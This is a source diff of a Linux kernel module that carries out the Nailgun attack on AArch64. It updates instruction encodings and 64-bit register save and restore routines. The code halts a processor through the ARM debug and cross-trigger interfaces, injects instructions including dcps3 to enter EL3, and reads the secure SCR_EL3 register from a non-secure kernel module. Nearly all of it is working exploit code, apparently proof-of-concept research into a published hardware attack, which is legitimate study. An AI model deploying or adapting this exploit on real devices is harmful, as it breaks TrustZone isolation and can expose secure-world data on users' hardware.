@@ -36,6 +36,8 @@ MODULE_DESCRIPTION("Read SCR by Nailgun attack with a non-secure kernel module")
 #define HDE				(1 << 14)
 #define EIE             (1 << 13)
 #define ITE                             (1 << 24)
+#define RXFULL                          (1<<30)
+#define TXFULL                          (1<<29)
 
 // Bits in EDRCR
 #define CSE                             (1 <<  2)
@@ -85,6 +87,24 @@ struct nailgun_param {
     void __iomem *cti_register;
 } t_param;
 
+static void check_txrx_edscr(void __iomem *debug) {
+    uint32_t reg;
+
+    reg = ioread32(debug + EDSCR_OFFSET);
+
+    if ((reg & RXFULL) == RXFULL) {
+        printk(KERN_INFO "instruction: // RXFULL is 1 - Can read value from DTRRX\n");
+    } else {
+        printk(KERN_INFO "instruction: // RXFULL is 0 - Can *write* value to DTRRX\n");
+    }
+
+    if ((reg & TXFULL) == TXFULL) {
+        printk(KERN_INFO "instruction: // TXFULL is 1 - Can read value from DTRTX\n");
+    } else {
+        printk(KERN_INFO "instruction: // TXFULL is 0 - nothing to read from DTRTX\n");
+    }
+}
+
 static void execute_ins_via_itr(void __iomem *debug, uint32_t ins) {
     uint32_t reg;
     // clear previous errors 
@@ -101,10 +121,16 @@ static void execute_ins_via_itr(void __iomem *debug, uint32_t ins) {
 
     if ((reg & ERR) == ERR) {
         printk(KERN_ERR "%s failed! instruction: 0x%08x EDSCR: 0x%08x\n", 
-            __func__, ins, reg);  
-    }
+            __func__, ins, reg);
+        return;
+    } 
+    // } else {
+        // printk(KERN_INFO "Instruction: 0x%08x executed successfully - EDSCR: 0x%08x\n",
+            // ins, reg);
+    // }
 }
 
+#if 0
 static uint32_t save_register(void __iomem *debug, uint32_t ins) {
     // Execute the ins to copy the target register to R0
     execute_ins_via_itr(debug, ins);
@@ -112,11 +138,33 @@ static uint32_t save_register(void __iomem *debug, uint32_t ins) {
     // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
     // execute_ins_via_itr(debug, 0x0e15ee00);
     // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
-    execute_ins_via_itr(debug, 0x0500d513); // fixed
+    // execute_ins_via_itr(debug, 0x0500d513); // fixed
+    execute_ins_via_itr(debug, 0xD5130400); // fixed
     // Read the DBGDTRTX via the memory mapped interface
     return ioread32(debug + DBGDTRTX_OFFSET);
 }
+#endif
 
+static uint64_t save_register_64(void __iomem *debug, uint32_t ins) {
+    uint64_t val;
+
+    // Execute the ins to copy the target register to X0
+    execute_ins_via_itr(debug, ins);
+
+    // Copy X0 to the DCC register DBGDTR
+    // 0x0500d513 <=> msr DBGDTR_EL0, X0
+    execute_ins_via_itr(debug, 0xD5130400); // fixed
+
+    // asm volatile("mrs %0, DBGDTRTX_EL0" : "=r" (val));
+
+    val = ioread32(debug + DBGDTRRX_OFFSET);
+    val = val << 32;
+    val |= ioread32(debug + DBGDTRTX_OFFSET);
+
+    return val;
+}
+
+#if 0
 static void restore_register(void __iomem *debug, uint32_t ins, uint32_t val) {
     // Copy value to the DBGDTRRX via the memory mapped interface
     iowrite32(val, debug + DBGDTRRX_OFFSET);
@@ -124,13 +172,34 @@ static void restore_register(void __iomem *debug, uint32_t ins, uint32_t val) {
     // 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
     // execute_ins_via_itr(debug, 0x0e15ee10);
     // 0x0500d533 <=> mrs x0, DBGDTRRX_EL0
-    execute_ins_via_itr(debug, 0x0500d533); // fixed
+    // execute_ins_via_itr(debug, 0x0500d533); // fixed
+    execute_ins_via_itr(debug, 0xD5330400); // fixed
     // Execute the ins to copy R0 to the target register
     execute_ins_via_itr(debug, ins);
 }
 
+#endif
+
+static void restore_register_64(void __iomem *debug, uint32_t ins, uint64_t val) {
+    // Copy value to the DBGDTRRX via the memory mapped interface
+    // iowrite64(val, debug + DBGDTRRX_OFFSET);
+    check_txrx_edscr(debug);
+    // asm volatile("msr DBGDTR_EL0, %0" : "=r" (val));    
+    iowrite32(val >> 32, debug + DBGDTRTX_OFFSET);
+    iowrite32(val, debug + DBGDTRRX_OFFSET);
+    check_txrx_edscr(debug);
+    // Copy the DCC register DBGDTRRX to X0
+    // 0x0500d533 <=> mrs x0, DBGDTR_EL0
+    execute_ins_via_itr(debug, 0xD5330400); // fixed
+
+    // Execute the ins to copy X0 to the target register
+    execute_ins_via_itr(debug, ins);
+}
+
+
 static void read_scr(void *addr) {
-    uint32_t reg, r0_old, dlr_old, scr;
+    uint32_t reg, scr, currentel, edscrval;
+    uint64_t dlr_old, x0_old;
     uint32_t dbgauth, dbglsr, dbgoslrs, ctilsr, ctioslrs;
     struct nailgun_param *param = (struct nailgun_param *)addr;
 
@@ -165,8 +234,6 @@ static void read_scr(void *addr) {
     reg |= HDE; // HALTING DEBUG MODE (14)
     reg |= EIE; // Execute Instruction Enable (13)
     iowrite32(reg, param->debug_register + EDSCR_OFFSET);
-
-    // TODO: Enable DBGSCR execute instruction enable bit (13)
 
     // Step 3: Send halt request to the target processor
     printk(KERN_INFO "Step 3: Halt the target processor\n");
@@ -213,49 +280,108 @@ static void read_scr(void *addr) {
         reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
     }
 
+
+    edscrval = ioread32(param->debug_register + EDSCR_OFFSET);
+    printk("EDSCR STATUS IS: 0x%08x\n", edscrval);
+
     // Step 5: Save context of the target core
     printk(KERN_INFO "Step 5: Save context\n");
     // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
     // execute_ins_via_itr(param->debug_register, 0x0e15ee00);
     // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
-    execute_ins_via_itr(param->debug_register, 0x0500d513); // fixed
-    r0_old = ioread32(param->debug_register + DBGDTRTX_OFFSET);
+    // execute_ins_via_itr(param->debug_register, 0x0500d513); // fixed
+
+
+    // Check the status of TXFull (should be 0 - can write to DBGDTRTX_EL0)
+    check_txrx_edscr(param->debug_register);
+
+    // Get the value of x0 and save it to DBGDTRTX_EL0
+    // 0x0500d513 <=> msr DBGDTR_EL0, x0
+    execute_ins_via_itr(param->debug_register, 0xD5130400);
+
+    printk(KERN_INFO "Finish executing MSR DBGDTRTX_EL0, x0");
+
+    // Save the value of x0 after we put it into DBGDTRTX into x0_old
+    // asm volatile("mrs %0, DBGDTRTX_EL0" : "=r" (x0_old));
+    x0_old = ioread32(param->debug_register + DBGDTRRX_OFFSET);
+    x0_old = x0_old << 32;
+    x0_old |= ioread32(param->debug_register + DBGDTRTX_OFFSET);
+
+    // x0_old = ioread64(param->debug_register + DBGDTRTX_OFFSET);
+
+    printk(KERN_INFO "Value of the old x0 is: 0x%016llx\n", x0_old);
+
+
     // 0xee740f35 <=> mrc p15, 3, R0, c4, c5, 1
     // dlr_old = save_register(param->debug_register, 0x0f35ee74);
     // mrs 0x4520d53b <=> mrs x0, DLR_EL0
-    dlr_old = save_register(param->debug_register, 0x4520d53b); // fixed
+    // dlr_old = save_register(param->debug_register, 0x4520d53b); // fixed
+
+    // Save the address to restart from into dlr_old
+    // mrs 0x4520d53b <=> mrs x0, DLR_EL0
+    dlr_old = save_register_64(param->debug_register, 0xD53B4520); // fixed
+
+    printk(KERN_INFO "Value of the dlr old is: 0x%016llx\n", dlr_old);
 
     // Step 6: Switch to EL3 to access secure resource
     printk(KERN_INFO "Step 6: Switch to EL3\n");
     // 0xf78f8003 <=> dcps3
     // execute_ins_via_itr(param->debug_register, 0x8003f78f);
     // 0xD4A00003 <=> dcps3
-    execute_ins_via_itr(param->debug_register, 0x0003d4a0); // fixed
+    // execute_ins_via_itr(param->debug_register, 0x0003d4a0); // fixed
+    execute_ins_via_itr(param->debug_register, 0xD4A00003); // fixed
 
 
     // Step 7: Read the SCR
     printk(KERN_INFO "Step 7: Read SCR\n");
+#if 1
     // 0xee110f11 <=> mrc p15, 0, R0, c1, c1, 0
     // execute_ins_via_itr(param->debug_register, 0x0f11ee11);
     // 0xD53E1100 <=> mrs x0, scr_el3
-    execute_ins_via_itr(param->debug_register, 0x1100d53e); // fixed
+    // execute_ins_via_itr(param->debug_register, 0x1100d53e); // fixed
+    execute_ins_via_itr(param->debug_register, 0xD53E1100); // fixed
     // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
     // execute_ins_via_itr(param->debug_register, 0x0e15ee00);
+
+    printk("Check txfull before reading SCR\n");
+
+    // Should be 0 so we can write to this register
+    check_txrx_edscr(param->debug_register);
+
     // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
-    execute_ins_via_itr(param->debug_register, 0x0500d513); // fixed
+    // execute_ins_via_itr(param->debug_register, 0x0500d513); // fixed
+    execute_ins_via_itr(param->debug_register, 0xD5130400); // fixed
+
     scr = ioread32(param->debug_register + DBGDTRTX_OFFSET);
 
+    printk(KERN_INFO "SCR_EL3 : 0x%08x\n", scr);
+#endif
+#if 0
+    // MRS X0, CURRENTEL
+    execute_ins_via_itr(param->debug_register, 0xD5384240);
+    // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
+    execute_ins_via_itr(param->debug_register, 0xD5130400);
+    currentel = ioread32(param->debug_register + DBGDTRTX_OFFSET);
+    printk(KERN_INFO "CURRENT EL: 0x%08x\n", currentel);
+#endif
     // Step 8: Restore context
     printk(KERN_INFO "Step 8: Restore context\n");
     // 0x0f35ee64 <=> mcr p15, 3, R0, c4, c5, 1
     // restore_register(param->debug_register, 0x0f35ee64, dlr_old);
     // 0x4520d51b <=> msr DLR_EL0, x0
-    restore_register(param->debug_register, 0x4520d51b, dlr_old); // fixed
-    iowrite32(r0_old, param->debug_register + DBGDTRRX_OFFSET);
+    // restore_register(param->debug_register, 0x4520d51b, dlr_old); // fixed
+    restore_register_64(param->debug_register, 0xD51B4520, dlr_old); // fixed
+
+    // iowrite32(x0_old, param->debug_register + DBGDTRRX_OFFSET);
+    iowrite32(x0_old >> 32, param->debug_register + DBGDTRTX_OFFSET);
+    iowrite32(x0_old, param->debug_register + DBGDTRRX_OFFSET);
+    // asm volatile("msr DBGDTRTX_EL0, %0" : "=r" (x0_old));
+
     // 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
     // execute_ins_via_itr(param->debug_register, 0x0e15ee10);
-    // 0xd5330500 <=> mrs x0, DBGDTRRX_EL0
-    execute_ins_via_itr(param->debug_register, 0x0500d533); // fixed
+    // 0xD5330400 <=> mrs x0, DBGDTR_EL0
+    // execute_ins_via_itr(param->debug_register, 0x0500d533); // fixed
+    execute_ins_via_itr(param->debug_register, 0xD5330400); // fixed
 
 
     // Step 9: Send restart request to the target processor
